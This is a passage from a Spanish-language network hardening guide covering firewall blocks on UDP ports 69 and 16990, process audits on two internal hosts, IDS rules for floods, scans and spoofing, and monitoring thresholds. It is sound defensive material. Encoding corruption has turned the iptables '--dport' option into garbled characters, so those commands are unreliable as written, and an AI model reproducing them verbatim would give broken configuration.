5.1. Bloquear el puerto UDP/69 salvo excepciones expl√≠citas
Restringirlo en toda la red interna para evitar transferencia abierta de archivos.
iptables -A INPUT -p udp ‚Äìdport 69 -j DROP
5.2. Uso de ACLs
Aplicar listas de control para bloquear solicitudes hacia broadcast donde no son necesarias.
deny udp any any eq 69

6. Mitigaci√≥n contra canales UDP no est√°ndar (puerto 16990)
6.1. Bloquear el tr√°fico hacia el puerto 16990
Cerrar el puerto 16990 en el firewall perimetral y local si no existe una justificaci√≥n documentada.
iptables -A INPUT -p udp ‚Äìdport 16990 -j DROP
6.2. Auditor√≠a de procesos
Revisar los hosts 192.168.10.12 y 192.168.10.13 para identificar procesos que est√©n usando ese puerto.
netstat -tunlp | grep 16990
ps aux | grep udp

7. Mitigaci√≥n continua (Monitoreo y endurecimiento)
7.1. Configurar un IDS/IPS
Se recomienda utilizar Snort o Suricata con reglas espec√≠ficas para detectar:
Flood ICMP
Solicitudes DHCP an√≥malas
Escaneos SYN
Spoofing
Uso de puertos no est√°ndar
7.2. Establecimiento de alertas
Configurar alertas en herramientas de monitoreo como Zabbix, PRTG o Grafana.
Los umbrales sugeridos incluyen:
Aumento anormal en tr√°fico ICMP
Incremento en solicitudes DHCP
Elevaci√≥n en paquetes TCP SYN
Actividad inesperada en puertos UDP
7.3. Endurecimiento de sistemas
Actualizaci√≥n continua de sistemas y firmware
Deshabilitar servicios no utilizados (como TFTP)
Monitoreo de integridad con herramientas como Wazuh o Tripwire
